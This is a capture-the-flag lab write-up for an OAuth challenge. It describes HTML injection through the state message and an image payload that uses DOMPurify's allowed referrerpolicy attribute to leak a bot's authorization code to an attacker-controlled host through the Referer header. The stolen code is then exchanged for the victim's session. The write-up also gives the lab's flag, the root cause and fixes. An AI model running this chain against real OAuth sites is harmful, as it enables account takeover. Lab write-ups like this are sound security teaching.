# Solo Leveling: HTMLi Gate — OAuth state message + Referer leak

Date: 2026-07-11
Target: https://solo-leveling-1-c043e8e00372.pwnbox-lab.com/
Google IdP: https://google-c043e8e00372.pwnbox-lab.com/
Bug class: HTML injection in OAuth state → DOMPurify misconfig (`referrerpolicy`) → OAuth code exfil via Referer

## Observation

- `GET /` sets `oauth_token` + `connect.sid`; OAuth link on homepage embeds base64 JSON `state`:
  `{"timestamp":...,"status":"ok","token":"...","message":""}`
- No `/init` (unlike sl2). State is attacker-readable from HTML.
- Failed callback → `/error?code=...&state=...` with inline script:
  - `DOMPurify.sanitize(state.message)` → `#message-container`
  - Custom hook allows `referrerpolicy` on `A`, `IMG`, `IFRAME`
- Non-empty `message` in state forces error path even with valid code (code stays in URL).

## Exploit chain

1. Attacker `GET /` → decode `token` from homepage `state`.
2. Build exfil `state` (base64 JSON) with same `token`, `message`:
   `<img referrerpolicy="unsafe-url" src="https://[oast]/x">`
3. Report Google OAuth URL (`prompt=none`, `state=<exfil_state>`) via `POST /report`.
4. Bot completes OAuth → `/error?code=REVIEWER_CODE&state=...` → img loads OAST with `Referer` containing `code=`.
5. Attacker exchanges with **clean state** (empty `message`, same `token`):
   `GET /callback?code=STOLEN&state=<clean_state>` → `/profile` → **Statue of God**.

## Flag

`pwnbox{d19250d9a046ca50847a5a75bc5e77a3}`

## Root cause

User-controlled HTML in OAuth `state.message` is sanitized with DOMPurify but `referrerpolicy="unsafe-url"` is explicitly allowed, enabling cross-origin resource loads that leak the full error-page URL (including OAuth `code`) via the `Referer` header.

## Fix

- Do not render attacker HTML on OAuth error pages; encode `message` as text.
- Remove `referrerpolicy` from DOMPurify allowlist; set `Referrer-Policy: no-referrer` on error pages.
- Bind authorization codes to single exchange; short TTL.

## vs other Solo Leveling labs

| Lab | Exfil |
|-----|-------|
| sl3 Origin Gate | postMessage `/logger` + hybrid hash |
| sl2 State Gate | OAuth CSRF staged code (no exfil) |
| sl1 HTMLi Gate | DOMPurify `referrerpolicy` → Referer leak |

## Knowledge base (extracted)

- `notes/dompurify-referrerpolicy-oauth-state-referer-leak.md` — reusable pattern
- `writeups/solo-leveling-htmli-gate-oauth-referrer-leak.md` — clean writeup
- `payloads/oauth/dompurify-referrerpolicy-state-message-referer-exfil.md` — exfil + exchange payload
